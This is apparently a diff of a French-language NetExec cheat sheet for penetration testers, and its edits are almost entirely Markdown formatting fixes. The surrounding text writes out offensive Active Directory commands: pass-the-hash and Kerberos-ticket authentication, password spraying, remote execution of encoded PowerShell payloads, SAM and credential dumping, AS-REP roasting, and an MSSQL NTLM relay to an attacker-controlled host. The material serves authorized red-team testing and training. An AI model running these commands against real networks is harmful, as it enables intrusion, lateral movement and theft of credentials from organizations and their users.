@@ -18,58 +18,56 @@ NetExec supporte plusieurs méthodes pour s'authentifier auprès des cibles :
 
 ```bash
 netexec <proto> <cible> -u <utilisateur | fichier_users> -p <mot_de_passe | fichier_pass> [-d <domaine>]
-````
+```
 
 - **Usage :** Méthode la plus simple, mais expose les mots de passe. Utile pour tester un identifiant spécifique ou faire du password spraying.
-    
+
 - `-d <domaine>` : Spécifie le domaine (ex: `CONTOSO.local`). Nécessaire pour les comptes de domaine.
-    
+
 
 #### Hash NTLM (Pass-The-Hash)
 
-```
+```bash
 netexec <proto> <cible> -u <utilisateur> -H <hash_ntlm | lm:ntlm> [-d <domaine>]
 ```
 
 - **Usage :** Permet de s'authentifier en utilisant directement le hash NTLM de l'utilisateur, sans connaître le mot de passe en clair. Très courant en post-exploitation.
-    
+
 - `-H <hash>` : Fournir le hash NTLM complet, ou au format `LM:NTLM`.
-    
+
 
 #### Ticket Kerberos (Pass-The-Ticket)
 
-```
+```bash
 export KRB5CCNAME=/chemin/vers/ticket.ccache
 netexec <proto> <cible> -k [--use-kcache] [-d <domaine>]
 ```
 
 - **Usage :** S'authentifie en utilisant un ticket Kerberos (TGT ou TGS) valide stocké dans un fichier cache (`.ccache`).
-    
+
 - `-k` : Active l'authentification Kerberos.
-    
+
 - `--use-kcache` : Indique explicitement d'utiliser le fichier défini par `KRB5CCNAME`.
-    
+
 - **Prérequis :** Un ticket Kerberos valide pour un utilisateur du domaine cible.
-    
+
 
 #### Connexion Anonyme / Null Session (SMB/LDAP)
 
-```
+```bash
 netexec smb <cible> -u '' -p ''
 netexec ldap <cible> -u '' -p ''
 ```
 
 - **Usage :** Tente de se connecter sans identifiants. Utile pour l'énumération initiale si les sessions null sont autorisées (rare sur les systèmes modernes et patchés).
-    
 
 #### Authentification Locale (SMB)
 
-```
+```bash
 netexec smb <cible> -u <utilisateur> -p <mot_de_passe> --local-auth
 ```
 
 - **Usage :** Force l'authentification en utilisant les comptes locaux de la machine cible plutôt que les comptes de domaine.
-    
 
 ### 🗄️ **Protocole SMB** (Server Message Block)
 
@@ -77,7 +75,7 @@ _Utilisé pour le partage de fichiers, l'impression, et certaines interactions �
 
 #### Énumération de Base
 
-```
+```bash
 # Vérifier l'accès (authentification)
 netexec smb <cible> -u <user> -p <pass | -H hash> [-d domain]
 
@@ -104,13 +102,12 @@ netexec smb <cible> [-u <user> -p <pass | -H hash>] --pass-pol
 ```
 
 - **Contexte :** Ces commandes permettent d'obtenir une vue d'ensemble de la configuration SMB de la cible, des ressources partagées, et de l'activité utilisateur.
-    
+
 - **Usage :** Reconnaissance initiale, identification de partages intéressants, recherche de sessions d'utilisateurs privilégiés.
-    
 
 #### Modules d'Énumération et Vulnérabilités (`-M`)
 
-```
+```bash
 # Vérifier si SMB Signing est désactivé (vulnérable au relais NTLM)
 netexec smb <cible | subnet> --gen-relay-list smb_signing_off.txt
 
@@ -131,13 +128,12 @@ netexec smb <cible> -u <user> -p <pass | -H hash> -M acl
 ```
 
 - **Contexte :** Utilisation de modules spécifiques pour rechercher des vulnérabilités connues ou obtenir des informations plus détaillées.
-    
+
 - **Usage :** Identification rapide de failles exploitables ou de configurations dangereuses.
-    
 
 #### Exécution de Commandes (`-x`, `-X`, `-M`)
 
-```
+```bash
 # Exécuter une commande simple via différentes méthodes (SMBExec, WMIExec, ATExec...)
 netexec smb <cible> -u <user> -p <pass | -H hash> -x <commande>
 # Exemple: netexec smb DC01 -u admin -p P@ss -x "whoami /all"
@@ -147,17 +143,17 @@ netexec smb <cible> -u <user> -p <pass | -H hash> -X 'powershell -enc <base64_pa
 ```
 
 - **Contexte :** Permet d'exécuter des commandes à distance sur les cibles où l'authentification réussit.
-    
+
 - **Usage :** Mouvement latéral, exécution de payloads, collecte d'informations supplémentaires.
-    
+
 - **Prérequis :** Droits d'administrateur local sur la machine cible.
-    
+
 - **OPSEC :** L'exécution de commandes est une action très surveillée.
-    
+
 
 #### Accès aux Fichiers et Partages
 
-```
+```bash
 # Lister récursivement les fichiers/dossiers sur les partages accessibles
 netexec smb <cible> -u <user> -p <pass | -H hash> --spider [nom_partage]
 # Exemple: netexec smb FS01 -u user -p Pass --spider Confidential
@@ -175,11 +171,11 @@ netexec smb <cible> -u <user> -p <pass | -H hash> --put-file fichier_local.txt '
 ```
 
 - **Contexte :** Interagir avec les partages de fichiers SMB.
-    
+
 - **Usage :** Recherche de fichiers sensibles, exfiltration de données, dépôt d'outils/payloads.
-    
+
 - **Prérequis :** Permissions de lecture/écriture appropriées sur les partages.
-    
+
 
 #### Dump d'Informations Sensibles
 
@@ -187,7 +183,7 @@ netexec smb <cible> -u <user> -p <pass | -H hash> --put-file fichier_local.txt '
 > 
 > Ces actions sont très intrusives, bruyantes et nécessitent des privilèges élevés (Admin local ou Domain Admin).
 
-```
+```bash
 # Dumper les hashes SAM locaux
 netexec smb <cible> -u <user> -p <pass | -H hash> --sam
 
@@ -214,9 +210,9 @@ netexec smb <cible> -u <user> -p <pass | -H hash> -M keepass_trigger -o KEEPASS_
 ```
 
 - **Contexte :** Extraction directe d'identifiants et de secrets depuis les systèmes cibles.
-    
+
 - **Usage :** Objectif principal de nombreuses attaques pour obtenir des identifiants et élever les privilèges.
-    
+
 
 ### 📔 **Protocole LDAP** (Lightweight Directory Access Protocol)
 
@@ -224,7 +220,7 @@ _Utilisé pour interroger et interagir avec l'annuaire Active Directory._
 
 #### Énumération LDAP
 
-```
+```bash
 # Énumération de base (infos domaine, DC)
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>]
 
@@ -240,13 +236,13 @@ netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --computers
 ```
 
 - **Contexte :** Interrogation de l'annuaire AD pour obtenir des informations sur les objets (utilisateurs, groupes, ordinateurs).
-    
+
 - **Usage :** Reconnaissance fondamentale en environnement AD. Peut souvent être fait avec un compte utilisateur standard.
-    
+
 
 #### Attaques Basées sur LDAP
 
-```
+```bash
 # AS-REP Roasting (Recherche/Exploitation des comptes sans pré-authentification)
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --asreproast <fichier_hashes>
 # Note: Peut parfois fonctionner en anonyme si on fournit une liste d'utilisateurs (-u users.txt -p '')
@@ -265,15 +261,15 @@ netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] -M maq
 ```
 
 - **Contexte :** Utilisation de requêtes LDAP spécifiques pour identifier des configurations vulnérables ou extraire des informations permettant des attaques hors ligne (crack de hash).
-    
+
 - **Usage :** Recherche de vecteurs d'escalade de privilèges ou de compromission de comptes.
-    
+
 
 ### 💻 **Protocole WINRM** (Windows Remote Management)
 
 _Permet l'administration à distance via PowerShell Remoting._
 
-```
+```bash
 # Vérifier l'accès WinRM
 netexec winrm <cible> -u <user> -p <pass | -H hash>
 
@@ -283,17 +279,16 @@ netexec winrm <cible> -u <user> -p <pass | -H hash> -X <commande>
 ```
 
 - **Contexte :** Alternative à SMB pour l'exécution de commandes à distance, utilise PowerShell.
-    
+
 - **Usage :** Mouvement latéral, exécution de scripts PowerShell.
-    
+
 - **Prérequis :** WinRM doit être activé et configuré sur la cible, et l'utilisateur doit avoir les droits appropriés (souvent admin local ou membre du groupe "Remote Management Users").
-    
 
 ### 🗄️ **Protocole MSSQL** (Microsoft SQL Server)
 
 _Interaction avec les bases de données SQL Server._
 
-```
+```bash
 # Vérifier l'accès MSSQL (Authentification SQL ou Windows)
 netexec mssql <cible> -u <sql_user> -p <pass>
 netexec mssql <cible> -u <win_user> -p <pass | -H hash> --local-auth # Auth Windows locale
@@ -315,13 +310,12 @@ netexec mssql <cible> -u <user> -p <pass> -M ntlmrelay -o RHOST=<ip_attaquant>
 ```
 
 - **Contexte :** Interaction directe avec les serveurs MSSQL.
-    
+
 - **Usage :** Énumération de bases de données, exécution de requêtes, potentielle exécution de commandes système ou relais NTLM si l'utilisateur a les privilèges suffisants (`sysadmin` pour `xp_cmdshell`, `public` peut suffire pour `xp_dirtree`).
-    
 
 ### 🖥️ **Protocole RDP** (Remote Desktop Protocol)
 
-```
+```bash
 # Vérifier si RDP est ouvert et si NLA est requis
 netexec rdp <cible>
 
